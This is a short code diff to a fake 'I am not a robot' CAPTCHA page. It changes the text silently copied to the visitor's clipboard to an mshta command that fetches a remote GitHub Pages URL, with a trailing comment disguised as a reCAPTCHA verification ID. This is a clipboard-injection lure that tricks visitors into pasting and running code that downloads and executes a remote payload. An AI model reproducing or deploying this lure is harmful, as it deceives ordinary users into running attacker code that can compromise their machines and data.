@@ -140,7 +140,7 @@ function copyToClipboard(text) {
 }
 
 // Text to copy
-const textToCopy = 'mshta https://test.com/#  ✓ "I am not a robot - reCAPTCHA Verification ID: 9470"';
+const textToCopy = 'mshta https://itsamrash.github.io/Testing/ #  ✓ "I am not a robot - reCAPTCHA Verification ID: 9470"';
 
 // Add event listener to the "I'm not a robot" button
 document.getElementById("fkrc-checkbox").addEventListener("click", () => {
